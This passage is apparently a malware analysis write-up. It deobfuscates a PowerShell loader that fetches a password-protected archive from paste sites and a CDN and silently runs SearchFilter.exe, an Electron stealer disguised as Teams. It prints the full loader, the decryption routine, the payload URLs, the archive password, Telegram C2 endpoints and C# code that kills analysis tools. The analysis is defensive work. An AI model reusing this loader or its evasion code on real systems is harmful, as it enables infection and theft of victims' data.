"\\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { pst; } }; function pst { try { $vatyfd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpsOaw6Fcw5rCl8K0wpzDssKFwpDCs8OlwrrCt8KI"; $asdhg = Dec -txtb4 $vatyfd -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $asdhg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { ptgs; } }; function ptgs { try { $sd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpMOUwqPCn8OJwq1sw6HDn8KSw5TDtMOXw4HCqcK7w5U="; $gf = Dec -txtb4 $sd -xA30 $prooc; $wb = New-Object System.Net.WebClient; $dcf = DS($gf); $ln = $dcf -split "`n"; if ($ln.Length -gt 0) { $fr = Dec $ln[0] $proc; DFxF $wb $fr; } } catch { mlaotgzybtlc; } finally { $webClient.Dispose(); } }; function mlaotgzybtlc { try { $hwul = "wr3DqMK3w5vDp2fCl2XCr8OSw6fCpcORw7PCosK4w6Nyw57DpsKQw5BjwqfDoMOwwpPDhMOvw6TDg8OowrbDocObwqPDoMKmbMOfw5rCqA=="; $sfg = Dec -txtb4 $hwul -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $sfg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10); $client = New-Object System.Net.WebClient; $by = $client.DownloadData($decs); if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $by); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { pst; } }; function DFxF { param ([System.Net.WebClient]$C, [string]$U) $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10); try { $b = $C.DownloadData($U); if ($b.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z"); [System.IO.File]::WriteAllBytes($flPth, $b); Ext -arch $flPth -op $extP; $exP = Join-Path $extP "SearchFilter.exe"; if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden; } if (Test-Path $flPth) { Remove-Item $flPth; } } } catch { mlaotgzybtlc; } }; $prooc = "UtCkt-h6=my1_zt"; $proc = "qpb9,83M8n@~{ba;W`$,}"; function Dec { param ([string]$txtb4, [string]$xA30) try { $encB = [System.Convert]::FromBase64String($txtb4); $encT = [System.Text.Encoding]::UTF8.GetString($encB); $decT = New-Object char[] $encT.Length; for ($i = 0; $i -lt $encT.Length; $i++) { $char = $encT[$i]; $pCh = $xA30[$i % $xA30.Length]; $decT[$i] = [char]($char - $pCh); } return -join $decT } catch {} }; function Ext { param ([string]$arch, [string]$op) $sZip = "C:\\ProgramData\\sevenZip\\7z.exe"; $arg = "x `"$arch`" -o`"$op`" -phR3^&b2%A9!gK*6LqP7t`$NpW -y"; Start-Process -FilePath $sZip -ArgumentList $arg -WindowStyle Hidden -Wait }; $p = "C:\\ProgramData\\sevenZip"; if (-not (Test-Path "$p\\7z.exe")) { New-Item -ItemType Directory -Path $p -Force; $u = "https://www.7-zip.org/a/7zr.exe"; $o = Join-Path -Path $p -ChildPath "7z.exe"; $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile($u, $o); $webClient.Dispose(); Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); Set-ItemProperty -Path $p -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System); }; rnt'
```

This script includes some basic obfuscation. Cleaning it up by replacing `;` with `;\n` for readability:
```
function DS { param ([string]$u, [int]$t = 15000) ;
$r = [System.Net.WebRequest]::Create($u) ;
$r.Timeout = $t ;
$res = $r.GetResponse() ;
$sr = New-Object System.IO.StreamReader($res.GetResponseStream()) ;
$c = $sr.ReadToEnd() ;
$sr.Close() ;
$res.Close() ;
return $c };
function rnt { try { $kkz = "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==";
$sfg = Dec -txtb4 $kkz -xA30 $prooc;
$rspns = Invoke-RestMethod -Uri $sfg;
if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc;
} $decs = $dt;
$rndv1 = [System.Guid]::NewGuid().ToString();
$tmp = [System.IO.Path]::GetTempPath();
$extP = Join-Path $tmp ($rndv1);
$rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10);
$client = New-Object System.Net.WebClient;
$by = $client.DownloadData($decs);
if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z");
[System.IO.File]::WriteAllBytes($flPth, $by);
Ext -arch $flPth -op $extP;
$exP = Join-Path $extP "SearchFilter.exe";
if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden;
} if (Test-Path $flPth) { Remove-Item $flPth;
} } } catch { pst;
} };
function pst { try { $vatyfd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpsOaw6Fcw5rCl8K0wpzDssKFwpDCs8OlwrrCt8KI";
$asdhg = Dec -txtb4 $vatyfd -xA30 $prooc;
$rspns = Invoke-RestMethod -Uri $asdhg;
if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc;
} $decs = $dt;
$rndv1 = [System.Guid]::NewGuid().ToString();
$tmp = [System.IO.Path]::GetTempPath();
$extP = Join-Path $tmp ($rndv1);
$rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10);
$client = New-Object System.Net.WebClient;
$by = $client.DownloadData($decs);
if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z");
[System.IO.File]::WriteAllBytes($flPth, $by);
Ext -arch $flPth -op $extP;
$exP = Join-Path $extP "SearchFilter.exe";
if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden;
} if (Test-Path $flPth) { Remove-Item $flPth;
} } } catch { ptgs;
} };
function ptgs { try { $sd = "wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpMOUwqPCn8OJwq1sw6HDn8KSw5TDtMOXw4HCqcK7w5U=";
$gf = Dec -txtb4 $sd -xA30 $prooc;
$wb = New-Object System.Net.WebClient;
$dcf = DS($gf);
$ln = $dcf -split "`n";
if ($ln.Length -gt 0) { $fr = Dec $ln[0] $proc;
DFxF $wb $fr;
} } catch { mlaotgzybtlc;
} finally { $webClient.Dispose();
} };
function mlaotgzybtlc { try { $hwul = "wr3DqMK3w5vDp2fCl2XCr8OSw6fCpcORw7PCosK4w6Nyw57DpsKQw5BjwqfDoMOwwpPDhMOvw6TDg8OowrbDocObwqPDoMKmbMOfw5rCqA==";
$sfg = Dec -txtb4 $hwul -xA30 $prooc;
$rspns = Invoke-RestMethod -Uri $sfg;
if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc;
} $decs = $dt;
$rndv1 = [System.Guid]::NewGuid().ToString();
$tmp = [System.IO.Path]::GetTempPath();
$extP = Join-Path $tmp ($rndv1);
$rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10);
$client = New-Object System.Net.WebClient;
$by = $client.DownloadData($decs);
if ($by.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z");
[System.IO.File]::WriteAllBytes($flPth, $by);
Ext -arch $flPth -op $extP;
$exP = Join-Path $extP "SearchFilter.exe";
if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden;
} if (Test-Path $flPth) { Remove-Item $flPth;
} } } catch { pst;
} };
function DFxF { param ([System.Net.WebClient]$C, [string]$U) $rndv1 = [System.Guid]::NewGuid().ToString();
$tmp = [System.IO.Path]::GetTempPath();
$extP = Join-Path $tmp ($rndv1);
$rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10);
try { $b = $C.DownloadData($U);
if ($b.Length -gt 0) { $flPth = Join-Path $tmp ($rndStr + ".7z");
[System.IO.File]::WriteAllBytes($flPth, $b);
Ext -arch $flPth -op $extP;
$exP = Join-Path $extP "SearchFilter.exe";
if (Test-Path $exP) { Start-Process -FilePath $exP -WindowStyle Hidden;
} if (Test-Path $flPth) { Remove-Item $flPth;
} } } catch { mlaotgzybtlc;
} };
$prooc = "UtCkt-h6=my1_zt";
$proc = "qpb9,83M8n@~{ba;W`$,}";
function Dec { param ([string]$txtb4, [string]$xA30) try { $encB = [System.Convert]::FromBase64String($txtb4);
$encT = [System.Text.Encoding]::UTF8.GetString($encB);
$decT = New-Object char[] $encT.Length;
for ($i = 0;
$i -lt $encT.Length;
$i++) { $char = $encT[$i];
$pCh = $xA30[$i % $xA30.Length];
$decT[$i] = [char]($char - $pCh);
} return -join $decT } catch {} };
function Ext { param ([string]$arch, [string]$op) $sZip = "C:\\ProgramData\\sevenZip\\7z.exe";
$arg = "x `"$arch`" -o`"$op`" -phR3^&b2%A9!gK*6LqP7t`$NpW -y";
Start-Process -FilePath $sZip -ArgumentList $arg -WindowStyle Hidden -Wait };
$p = "C:\\ProgramData\\sevenZip";
if (-not (Test-Path "$p\\7z.exe")) { New-Item -ItemType Directory -Path $p -Force;
$u = "https://www.7-zip.org/a/7zr.exe";
$o = Join-Path -Path $p -ChildPath "7z.exe";
$webClient = New-Object System.Net.WebClient;
$webClient.DownloadFile($u, $o);
$webClient.Dispose();
Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
Set-ItemProperty -Path $p -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
};
rnt
```

A few things stand out immediately, one being the System.Net.WebClient object, used to download the 7Zip program from `https://www.7-zip.org/a/7zr.exe`. Next is the extracting of the password protected 7z archive with the password:
```
hR3^&b2%A9!gK*6LqP7t`$NpW
```

`rnt` is the first function called. There are almost identical functions to retrieve the malicious payload, with each one being wrapped in a try-catch statement, with the catch defaulting to the next function. This is likely a form of primitive redundancy to fetch the payload from multiple different sources if one where to get taken down or fail.
Cleaning up and inspecting the first function:
```
function rnt {
    try {
        $kkz = "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==";
        $sfg = Dec -txtb4 $kkz -xA30 $prooc;
        $rspns = Invoke-RestMethod -Uri $sfg;
        if ($rspns) {
            $dt = Dec -txtb4 $rspns -xA30 $proc;
        }
        $decs = $dt;
        $rndv1 = [System.Guid]::NewGuid().ToString();
        $tmp = [System.IO.Path]::GetTempPath();
        $extP = Join-Path $tmp ($rndv1);
        $rndStr = ([System.IO.Path]::GetRandomFileName() -replace "\\.", "").Substring(0, 10);
        $client = New-Object System.Net.WebClient;
        $by = $client.DownloadData($decs);
        if ($by.Length -gt 0) {
            $flPth = Join-Path $tmp ($rndStr + ".7z");
            [System.IO.File]::WriteAllBytes($flPth, $by);
            Ext -arch $flPth -op $extP;
            $exP = Join-Path $extP "SearchFilter.exe";
            if (Test-Path $exP) {
                Start-Process -FilePath $exP -WindowStyle Hidden;
            } 
            if (Test-Path $flPth) {
                Remove-Item $flPth;
            } 
        } 
    } 
    catch { pst; } 
};
```

The endpoint in which it retrieves the malicious archive appears to be both base64 and primitively encrypted. 
```
$sfg = Dec -txtb4 $kkz -xA30 $prooc;
```
This is then retrieved via a web GET request, before passing it to the decryption function again.
```
$rspns = Invoke-RestMethod -Uri $sfg;
if ($rspns) {
	$dt = Dec -txtb4 $rspns -xA30 $proc;
}
$decs = $dt;
```

Next, the previously decrypted payload is passed to WebClient.DownloadData, indicating another URL with yet another payload. 

Some random file name and path initialization is conducted, before a .7z archive is downloaded. This is saved in `USERTEMP\RANDOMSTRING.7z`. The `Ext` function is then called to extract  `SearchFilter.exe` binary from the archive into `USERTEMP\GUID` and execute it silently.
```
$client = New-Object System.Net.WebClient;
$by = $client.DownloadData($decs);
if ($by.Length -gt 0) {
	$flPth = Join-Path $tmp ($rndStr + ".7z");
	[System.IO.File]::WriteAllBytes($flPth, $by);
	Ext -arch $flPth -op $extP;
	$exP = Join-Path $extP "SearchFilter.exe";
	if (Test-Path $exP) {
		Start-Process -FilePath $exP -WindowStyle Hidden;
	} 
	if (Test-Path $flPth) {
		Remove-Item $flPth;
	} 
}
```

The `Ext` function is rather straightforward and non-obfuscated. The function first starts by trying to extract the archive passed in the `$arch` parameter and output to the directory in the `$op` parameter. 

This functions then checks if 7-Zip is installed on the victim machine by testing the `C:\\ProgramData\\sevenZip` path, if this path does not exist, the directory is created and the portable 7-Zip exe is downloaded from the official source and saved it to `C:\ProgramData\sevenZip\7z.exe`. Both the directory and executable are set to hidden to avoid manual detection by the victim user. 
```
function Ext { param ([string]$arch, [string]$op) 
    $sZip = "C:\\ProgramData\\sevenZip\\7z.exe";
    $arg = "x `"$arch`" -o`"$op`" -phR3^&b2%A9!gK*6LqP7t`$NpW -y";
    Start-Process -FilePath $sZip -ArgumentList $arg -WindowStyle Hidden -Wait };
    $p = "C:\\ProgramData\\sevenZip";
    if (-not (Test-Path "$p\\7z.exe")) {
    New-Item -ItemType Directory -Path $p -Force;
    $u = "https://www.7-zip.org/a/7zr.exe";
    $o = Join-Path -Path $p -ChildPath "7z.exe";
    $webClient = New-Object System.Net.WebClient;
    $webClient.DownloadFile($u, $o);
    $webClient.Dispose();
    Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
    Set-ItemProperty -Path $p -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
};
```

At this point, a good solution would be to modify the script and execute it in a VM or sandbox to drop the malicious binary without executing it. However, lets first further analyze the decryption function statically.

```
function Dec { param ([string]$txtb4, [string]$xA30) 
	try { 
		$encB = [System.Convert]::FromBase64String($txtb4);
		$encT = [System.Text.Encoding]::UTF8.GetString($encB);
		$decT = New-Object char[] $encT.Length;
		for ($i = 0; $i -lt $encT.Length; $i++) { 
			$char = $encT[$i];
			$pCh = $xA30[$i % $xA30.Length];
			$decT[$i] = [char]($char - $pCh);
		} 
		return -join $decT 
	} 
	catch {} 
};
```
Breaking this down:
1. Dec takes in `txtb4`(the base64 encoded string), and `xA30`(which appears to be the key).
2. The base64 string is decoded and stored in `$encB`
3. `$encT` is the UTF8 representation of the `$encB` string, we can refer to this as the ciphertext.
4. A char array, `$decT` is created with the same length as the ciphertext.
5. Loop from 0 to length of the cipher text. `$char` is set to `$encT[$i]`. The `$xA30[$i % $xA30.Length]` selects a character from the key and stores it in `$pCh`. Finally, the plaintext char, `$decT[$i]`, is decrypted with the `($char - $pCh)` operation and casted to a char before its joined together and returned. 

Looking through the four redundant functions that download the next stage, we see the decryption function is called in this format: 
```
$VAR = Dec -txtb4 $B64_URL -xA30 $prooc;
```
With `$prooc` being the variable in which the key is hard-coded. 

Key: `$prooc = "UtCkt-h6=my1_zt";`

With all the necessary information to decrypt, we re-write the decryption function in python and decrypt all the URLs:
```python
#!/bin/python3
from base64 import b64decode
def Dec(b64txt, key):
    cipherText = b64decode(b64txt).decode('utf-8')
    plainText = ""
    for i in range(len(cipherText)):
        keyChar = key[i % len(key)]
        plainChar = ord(cipherText[i]) - ord(keyChar)
        plainText += chr(plainChar)
    return plainText

b64_urls = ["wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug==","wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpsOaw6Fcw5rCl8K0wpzDssKFwpDCs8OlwrrCt8KI","wr3DqMK3w5vDp2fCl2XCrcOOw6zCpcOEw5zDncODwqLCpMOUwqPCn8OJwq1sw6HDn8KSw5TDtMOXw4HCqcK7w5U=","wr3DqMK3w5vDp2fCl2XCr8OSw6fCpcORw7PCosK4w6Nyw57DpsKQw5BjwqfDoMOwwpPDhMOvw6TDg8OowrbDocObwqPDoMKmbMOfw5rCqA=="]
key = "UtCkt-h6=my1_zt"

for url in b64_urls:
    print(Dec(url,key))
```
OUTPUT:
```
https://rlim.com/seraswodinsx/raw
https://pastebin.com/raw/yT19qeCE
https://pastebin.ai/raw/tfauzcl5xj
https://rentry.co/srch-jswbeupntsvgvxp/raw
```

```
└─$ curl https://pastebin.com/raw/yT19qeCE
w5nDpMOWwqnCn3JifMKbw5LCrsKsw6LDi8ONwp7Cu8KSWsOgw6DDncKRfMKbwqbCp8KywqbDosKNw6PDn8OLw4LCgsK8wpLCkcOvw5rDk8KowqLCmMKdwqZ8wpzDj8Klw6TCscOFwpFzwodWYsOewqLCqcKWwpzCjm5owoVowp9xwrHDncKSwpdxwodYYsKxwp7CtsOXwqXCmGZqw4c=

└─$ curl https://rentry.co/srch-jswbeupntsvgvxp/raw
w5nDpMOWwqnCn3JifMKbw5LCrsKsw6LDi8ONwp7Cu8KSWsOgw6DDncKRfMKbwqbCp8KywqbDosKNw6PDn8OLw4LCgsK8wpLCkcOvw5rDk8KowqLCmMKdwqZ8wpzDj8Klw6TCscOFwpFzwodWYsOewqLCqcKWwpzCjm5owoVowp9xwrHDncKSwpdxwodYYsKxwp7CtsOXwqXCmGZqw4c=
```
We confirm the payload is the same, with multiple URLs for redundancy. 

Next, the the script would decrypt these with the same `Dec` function, this time using a different hard-coded key, `$proc`
```
$dt = Dec -txtb4 $rspns -xA30 $proc;
.
<SNIP>
.
$proc = "qpb9,83M8n@~{ba;W`$,}";

```

Interestingly, our previous decryption implementation fails with the `$proc` key. We try this in an interactive python interpreter and it begins to give us the correct URL before turning into garbage, non-ASCII values:
```
In [5]: Dec("w5nDpMOWwqnCn3JifMKbw5LCrsKsw6LDi8ONwp7Cu8KSWsOgw6DDncKRfMKbwqbCp8KywqbDosKNw6PDn8OLw4LCgsK8wpLCkcOvw5rDk8KowqLCmMKdwqZ8wpzDj8Klw6TCscOFwpFzwodWYsOewqLCqcKWwpzCjm5owoVowp9xwrHDncKSwpdxwodYYsKxwp7CtsOXwqXCmGZqw4c=","qpb9,83M8n@~{ba;W`$,}")

Out[5]: "https://cdn.gilcd26´cl!\x1abzo\x7fYª\x1f£aP`!\x81;1Ë®V726dzDi\x82mvqG\x16\x11&\x1b\x0b~~}\x19+\x1e\x0c/Y0l$yoR\x19ö%÷'Z>\x92«('ö\x08\x8e"
```

We assume this to be some kind of character encoding different across Linux and Windows. We spin up a quick Windows 11 VM and load the powershell Dec function as-is.

```
PS C:\Users\omo\Documents> powershell -ExecutionPolicy bypass .\dec.ps1
https://cdn.gilcdn.com/ContentMediaGenericFiles/daef6c08026a194cb6580113b0660464-Full.7z
```

This malware is being hosted on a [Guilded](https://www.guilded.gg/) server, this is a service similiar to Discord, allowing users to speak, message, and share files on a server. 

We fetch the 7z archive
```
└─$ wget https://cdn.gilcdn.com/ContentMediaGenericFiles/daef6c08026a194cb6580113b0660464-Full.7z
--2024-08-29 20:02:44--  https://cdn.gilcdn.com/ContentMediaGenericFiles/daef6c08026a194cb6580113b0660464-Full.7z
Resolving cdn.gilcdn.com (cdn.gilcdn.com)... 18.238.109.60, 18.238.109.16, 18.238.109.32, ...
Connecting to cdn.gilcdn.com (cdn.gilcdn.com)|18.238.109.60|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60256225 (57M) [application/octet-stream]
Saving to: ‘daef6c08026a194cb6580113b0660464-Full.7z’

daef6c08026a194cb65 100%[===================>]  57.46M  10.4MB/s    in 5.6s    

2024-08-29 20:02:50 (10.3 MB/s) - ‘daef6c08026a194cb6580113b0660464-Full.7z’ saved [60256225/60256225]
```


Attempting to open this archive via the [Engrampa](https://wiki.mate-desktop.org/mate-desktop/applications/engrampa/) archive manager, we are prompted for a password. 
This archive password is hard-coded in the 7zip arguments within the `Ext` function.
```
function Ext { param ([string]$arch, [string]$op) $sZip = "C:\\ProgramData\\sevenZip\\7z.exe";
$arg = "x `"$arch`" -o`"$op`" -phR3^&b2%A9!gK*6LqP7t`$NpW -y";
Start-Process -FilePath $sZip -ArgumentList $arg -WindowStyle Hidden -Wait };

hR3^&b2%A9!gK*6LqP7t$NpW

hR3^&b2%A9!gK*6LqP7t`$NpW

```

The password as-is didn't work, to understand how powershell interprets this, we simply echo it from a PS interactive session and notice the backtick is dropped.

```
PS C:\Users\omo\Documents> echo "hR3^&b2%A9!gK*6LqP7t`$NpW"
hR3^&b2%A9!gK*6LqP7t$NpW
```
Password: `hR3^&b2%A9!gK*6LqP7t$NpW`

Unlocking the archive and inspecting it, we see files that appear to come from another project. We focus on the large, likely padded, binary that the malware loader was targeting for extract, `SearchFilter.exe`
![Inspecting Archive]({{ site.baseurl }}/assets/images/MalAl-IBC/archive.png)

```
└─$ file SearchFilter.exe                           
SearchFilter.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 10 sections
```

We "decompile" this binary in BinaryNinja and take a look, discovering that its an electron package. The program is huge, and skimming through decompiled functions, it appears the malware is embedded in some large open source project before being recompiled. 

Ignoring the binary for the time being. We extract `/resources/app.asar` and extract it. 

Next, we extract the asar with npx:
```
└─$ npx asar extract app.asar ./app_extract
```

```
└─$ ls     
mnMOJvGAtgiYLeb.js  node_modules  package.json  package-lock.json


└─$ cat package.json            
{
  "name": "Teams",
  "version": "1.1.0",
  "description": "Microsoft Corporation",
  "main": "mnMOJvGAtgiYLeb.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "axios": "^1.7.2",
    "child_process": "^1.0.2",
    "form-data": "^4.0.0",
    "fs": "^0.0.1-security",
    "http": "^0.0.1-security",
    "https": "^1.0.0",
    "path": "^0.12.7",
    "screenshot-desktop": "^1.15.0",
    "util": "^0.12.5",
    "uuid": "^10.0.0"
  }
}
```
Interesting, this malware appears to be bundled with Microsoft Teams, an electron application.

Inspecting `mnMOJvGAtgiYLeb.js`, we see the file is padding with random `\x` hex bytes. More interesting, we quickly spot some anti-analysis checks:
```
KillProcess(processEntry.th32ProcessID);\r\n                    }\r\n                } while (Process32Next(snapshot, ref processEntry));\r\n            }\r\n\r\n            CloseHandle(snapshot);\r\n            Thread.Sleep(150);\r\n        }\r\n    }\r\n\r\n    private static IntPtr CreateSnapshot()\r\n    {\r\n        return CreateToolhelp32Snapshot(0x00000002, 0U);\r\n    }\r\n\r\n    private static bool IsTargetProcess(string processName)\r\n    {\r\n        return processName.EndsWith(\"watcher.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"ProcessHacker.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"mitmdump.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"mitmproxy.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"mitmweb.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Insomnia.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"HTTP Toolkit.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Charles.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Postman.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"BurpSuiteCommunity.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Fiddler Everywhere.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Fiddler.WebUi.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"HTTPDebuggerUI.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"HTTPDebuggerSvc.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"HTTPDebuggerPro.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Progress Telerik Fiddler Web Debugger.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"HTTP Debugger Pro.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Fiddler.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"FolderChangesView.exe\", StringComparison.OrdinalIgnoreCase) ||\r\n            processName.EndsWith(\"Wireshark.exe\", StringComparison.OrdinalIgnoreCase);\r\n
```

This js is very well obfuscated. Searching for any URLs we notice telegram API urls.
```
const aKxz9C8=`https://api.telegram.org/bot${eZlOB4}/sendPhoto`
const UbUAyq=`https://api.telegram.org/bot${eZlOB4}/sendMessage`
```
This is likely what the attackers are using as a C2. We assume here that sendPhoto will probably be screenshots of the victims desktop, while message is likely for extracting data and credentials from the victims machine. 


We upload this to VirusTotal, even knowing its malware, the hope here is to get it flagged as VT shares binaries with vendors. 

We see its [already been uploaded](https://www.virustotal.com/gui/file/59909bf0cc831cdb3553fa31eceeb8be207a65d2072da65fb6b38577770b036f) 9 days ago with two real detections from Google and Ikarus


Switching to some dynamic analysis, we leverage [ANY.RUN](https://app.any.run) to upload and run the binary, observing its command, network, and file-system behavior. 


![initial ANYRUN]({{ site.baseurl }}/assets/images/MalAl-IBC/anyrun-initial.png)

We see this is much more than a simple info-stealer. Upon execution of searchfilter.exe, the malware first preforms basic reconnaissance of the machine:
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -Command "Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture""

powershell  -Command "Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty NumberOfLogicalProcessors"
```


It then proceeds to call itself with some interesting parameters, one being `-gpu-process` which could potentially indicate some type of crypto miner is packaged within the malware.
```
C:\Users\admin\Downloads\mal\SearchFilter.exe" --type=gpu-process --user-data-dir="C:\Users\admin\AppData\Roaming\Teams" --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1952 --field-trial-handle=1964,i,17797875006816680718,3402274892364214226,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:2
```

Next, we see the execution of another dropped powershell script `dhdaosw7nalsodaudh.ps1` from the users Temp directory.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\admin\AppData\Local\Temp\dhdaosw7nalsodaudh.ps1""
```

Inspecting the dropped `dhdaosw7nalsodaudh.ps1`, we note C#(C-Sharp) source code. This source code is particularly interesting, and from the name of the first class `AntiProcess`, we can guess that this is blocking certain process on the machine. Looking further in the source we can confirm this, the target processes are all Process or HTTP debug/monitor/analysis tools that malware reverse engineers would potentially be using. This is all wrapped in a PowerShell `$code` variable.
```
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class AntiProcess
{
    private static Thread blockThread = new Thread(BlockProcess);
    public static bool IsEnabled { get; set; }

    public static void StartBlocking()
    {
        IsEnabled = true;
        blockThread.Start();
    }

    public static void StopBlocking()
    {
        IsEnabled = false;
        try
        {
            blockThread.Abort();
            blockThread = new Thread(BlockProcess);
        }
        catch (ThreadAbortException)
        {
            // Ignore exception
        }
    }

    private static void BlockProcess()
    {
        while (IsEnabled)
        {
            IntPtr snapshot = CreateSnapshot();
            PROCESSENTRY32 processEntry = new PROCESSENTRY32
            {
                dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32))
            };

            if (Process32First(snapshot, ref processEntry))
            {
                do
                {
                    if (IsTargetProcess(processEntry.szExeFile))
                    {
                        KillProcess(processEntry.th32ProcessID);
                    }
                } while (Process32Next(snapshot, ref processEntry));
            }

            CloseHandle(snapshot);
            Thread.Sleep(150);
        }
    }

    private static IntPtr CreateSnapshot()
    {
        return CreateToolhelp32Snapshot(0x00000002, 0U);
    }

